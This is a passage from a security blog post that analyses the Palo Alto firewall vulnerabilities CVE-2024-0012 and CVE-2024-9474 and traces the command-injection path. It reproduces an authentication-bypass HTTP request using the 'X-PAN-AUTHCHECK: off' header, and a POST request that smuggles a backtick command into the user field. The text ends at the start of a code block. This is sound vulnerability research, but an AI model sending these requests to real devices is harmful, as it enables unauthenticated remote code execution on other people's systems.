<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="From CVE-2024-0012 to CVE-2024-9474 Analysis and Reflections on Palo Alto" />
<meta name="author" content="imjdl" />
<meta property="og:locale" content="en" />
<meta name="description" content="This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmA" />
<meta property="og:description" content="This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmA" />
<link rel="canonical" href="/posts/pa/" />
<meta property="og:url" content="/posts/pa/" />
<meta property="og:site_name" content="imjdl blog" />
<meta property="og:image" content="/assets/img/20250424/logo.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-04-24T11:33:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/20250424/logo.png" />
<meta property="twitter:title" content="From CVE-2024-0012 to CVE-2024-9474 Analysis and Reflections on Palo Alto" />
<meta name="twitter:site" content="@Mortyjin" />
<meta name="twitter:creator" content="@MortyJin" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imjdl","url":"https://github.com/imjdl/"},"dateModified":"2025-04-24T11:33:00+08:00","datePublished":"2025-04-24T11:33:00+08:00","description":"This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmA","headline":"From CVE-2024-0012 to CVE-2024-9474 Analysis and Reflections on Palo Alto","image":"/assets/img/20250424/logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/pa/"},"url":"/posts/pa/"}</script>
<!-- End Jekyll SEO tag -->


  <title>From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto | imjdl blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imjdl blog">
<meta name="application-name" content="imjdl blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js,npm/mermaid@11.4.0/dist/mermaid.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script async src="/assets/js/data/mathjax.js"></script>
  <script async src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>


<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/log.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">imjdl blog</a>
    <p class="site-subtitle fst-italic mb-0">Perpetual student, continual incremental improvement.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/reading-list/" class="nav-link">
            <i class="fa-fw fa fa-list-alt"></i>
            

            <span>READING LIST</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imjdl"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/Mortyjin"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['imelloit','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1745465580"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Apr 24, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/20250424/logo.png" class="popup img-link preview-img shimmer"><img src="/assets/img/20250424/logo.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/imjdl/">imjdl</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2580 words"
>
  <em>14 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <p><em>This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmA</em></p>

<h2 id="introduction"><span class="me-2"><strong>Introduction</strong></span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>This paper is a vulnerability analysis review. 2024 saw two serious security vulnerabilities in Palo Alto Networks’ firewall and SSL VPN products: CVE-2024-0012 and CVE-2024-9474. these two vulnerabilities (the authentication bypass vulnerability and the elevation of privilege vulnerability) can be exploited in combination to enable authentication-less remote code execution without authentication. watchtowr provides an excellent analysis of the process from identity bypass to command execution. However, the article fails to go deep enough when the analysis involves the panCreateRemoteAppwebSession function, which leaves one wanting more. Since the author could not fully understand the process of command execution when reproducing the vulnerability, he decided to do it himself instead of asking for help. In this article will watchtowr analysis based on a brief review of the identity bypass problem, and in-depth analysis of the specific implementation of the command execution, combined with the newly discovered authentication bypass vulnerability <strong>CVE-2025-0108, to explore</strong> the possibility of combining the use of <strong>CVE-2025-0108 and</strong> CVE-2024-9474.</p>

<h2 id="vulnerability-analysis"><span class="me-2"><strong>Vulnerability Analysis</strong></span><a href="#vulnerability-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="cve-2024-0012-authentication-bypass"><span class="me-2"><strong>CVE-2024-0012: Authentication Bypass</strong></span><a href="#cve-2024-0012-authentication-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Based on watchtowr’s analysis, we know that prior to the vulnerability fix, Palo Alto had a security risk when processing requests ending in .js.map: these requests were assumed to be authenticated without setting the X-pan-AuthCheck header. The subsequent fix was to add the X-pan-AuthCheck authentication requirement to proxy_default.conf.</p>

<p><a href="/assets/img/20250424/image.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image.png" alt="image.png" loading="lazy"></a></p>

<p><a href="/assets/img/20250424/image2.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image2.png" alt="image.png" loading="lazy"></a></p>

<p>All requests via Nginx are forwarded to a locally running Apache server (which listens on port 28250) for subsequent processing.</p>

<p><a href="/assets/img/20250424/image3.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image3.png" alt="image.png" loading="lazy"></a></p>

<p><a href="/assets/img/20250424/image4.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image4.png" alt="image.png" loading="lazy"></a></p>

<p>In php.ini you can see that the auto_prepend_file directive is configured, which automatically loads the uiEnvSetup.php file for environment variable checking before executing any PHP scripts.</p>

<p><a href="/assets/img/20250424/image5.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image5.png" alt="image.png" loading="lazy"></a></p>

<p>In uiEnvSetup.php, the system decides whether to authenticate the current request by checking three conditions:</p>

<ol>
  <li><strong>Request header check</strong>: if the value of request header <code class="language-plaintext highlighter-rouge">HTTP_X_PAN_AUTHCHECK</code> is not <code class="language-plaintext highlighter-rouge">'off',</code> then authentication is required.</li>
  <li><strong>Script path check</strong>: if the current script path is not <code class="language-plaintext highlighter-rouge">/CA/ocsp</code> or <code class="language-plaintext highlighter-rouge">/php/login.php</code>, authentication is required.</li>
  <li><strong>Local request check</strong>: if the request is not from the local host ( <code class="language-plaintext highlighter-rouge">127.0.0.1</code> ), authentication is required.</li>
</ol>

<p>When all the above conditions are met, the system performs authentication. If any of the conditions are not met, the authentication check is skipped.</p>

<p><a href="/assets/img/20250424/image6.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image6.png" alt="image.png" loading="lazy"></a></p>

<p>Therefore, by adding X-PAN-AUTHCHECK: off to the HTTP request header, an attacker can bypass the authentication check and illegally access PHP resources.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/php/ztp_gate.php/.js.map</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.32.251</span>
<span class="na">X-PAN-AUTHCHECK</span><span class="p">:</span> <span class="s">off</span>

</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/20250424/image7.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image7.png" alt="image.png" loading="lazy"></a></p>

<p>After bypassing the authentication check, the attacker can access critical PHP files. Within these files, the watchtowr team discovered an elevation of privilege vulnerability in the GlobalProtect client, which exists in the panCreateRemoteAppwebSession function. This vulnerability allows an attacker to execute arbitrary commands on the target system, completing the full attack chain from authentication bypass to remote code execution.</p>

<h3 id="cve-2024-9474-elevation-of-privilege"><span class="me-2"><strong>CVE-2024-9474: Elevation of Privilege</strong></span><a href="#cve-2024-9474-elevation-of-privilege" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>According to the payload provided by watchtowr, the exploit process for <strong>CVE-2024-9474</strong> is very straightforward: an attacker sends a POST request to createRemoteAppwebSession.php, injects a payload into the user parameter, and then triggers a sessionid to execute the payload. After getting the session id, the payload is triggered.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>POST /php/utils/createRemoteAppwebSession.php/aaaa.js.map HTTP/1.1
Host: 
X-PAN-AUTHCHECK: off
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

<span class="nv">user</span><span class="o">=</span><span class="sb">`</span>payload<span class="sb">`</span>&amp;userRole<span class="o">=</span>superuser&amp;remoteHost<span class="o">=</span>&amp;vsys<span class="o">=</span>vsys1
</pre></td></tr></tbody></table></code></div></div>

<p>In watchtowr’s analysis, the analysis stops abruptly when it comes to the <code class="language-plaintext highlighter-rouge">panCreateRemoteAppwebSession</code> function, and does not go any further in explaining the specific trigger point of CVE-2024-9474. Attackerkb’s description of the vulnerability mentions the following:</p>

<p><a href="/assets/img/20250424/image8.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image8.png" alt="image.png" loading="lazy"></a></p>

<p>According to Attackerkb’s analysis, when the AuditLog.write function is called, the tampered username value is passed to the pexecute call, which leads to command injection.</p>

<p><a href="/assets/img/20250424/image9.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image9.png" alt="image.png" loading="lazy"></a></p>

<p>However, when analyzing the process by using pspy, it was found that the actual command executed was not from AuditLog.write, but rather the payload was executed in a sub-process (ppid) of configd. This clearly indicates that the trigger for <strong>CVE-2024-9474</strong> is not here, but rather exists in the process associated with configd.</p>

<p><a href="/assets/img/20250424/image10.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image10.png" alt="image.png" loading="lazy"></a></p>

<p>By executing the command find /usr/local/ -type f ! -path <em>“/cgroup/</em> “ ! -path <em>“/sys/</em> “ ! -path <em>“/tmp/</em> “ ! -path <em>“/cache/</em> “ ! -path <em>“/logs/</em> “ -exec grep -l “export panusername=” {} \; Searching for the file containing the command execution feature revealed that the feature exists in the pan_op_ctxt_get_env function in /usr/local/lib64/libpanmp_mp.so.1.0.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="o">[</span>root@PA-VM /]# find /usr/local/ <span class="nt">-type</span> f <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/cgroup/*"</span> <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/sys/*"</span> <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/tmp/*"</span> <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/cache/*"</span> <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/logs/*"</span> <span class="nt">-exec</span> <span class="nb">grep</span> <span class="nt">-l</span> <span class="s2">"export panusername="</span> <span class="o">{}</span> <span class="se">\;</span>
/usr/local/lib64/libpanmp_mp.so.1.0
<span class="o">[</span>root@PA-VM /]# 
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/20250424/image11.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image11.png" alt="image.png" loading="lazy"></a></p>

<p>The pan_mgmtop_handle_script_or_exec function first gets the username from the session via pan_cfg_get_username_by_cookie and saves <code class="language-plaintext highlighter-rouge">the payload</code> to the local_88 buffer. It then calls the pan_op_ctxt_get_env function to set up the command execution environment, including configuring environment variables and permissions. After setting up the environment, the system splices the user-supplied command or script parameters directly into the environment command string. Finally, this complete command string is passed to the pan_get_system_cmd_output function for execution and the result is returned.</p>

<div class="language-c++ highlighter-rouge"><div class="code-header">
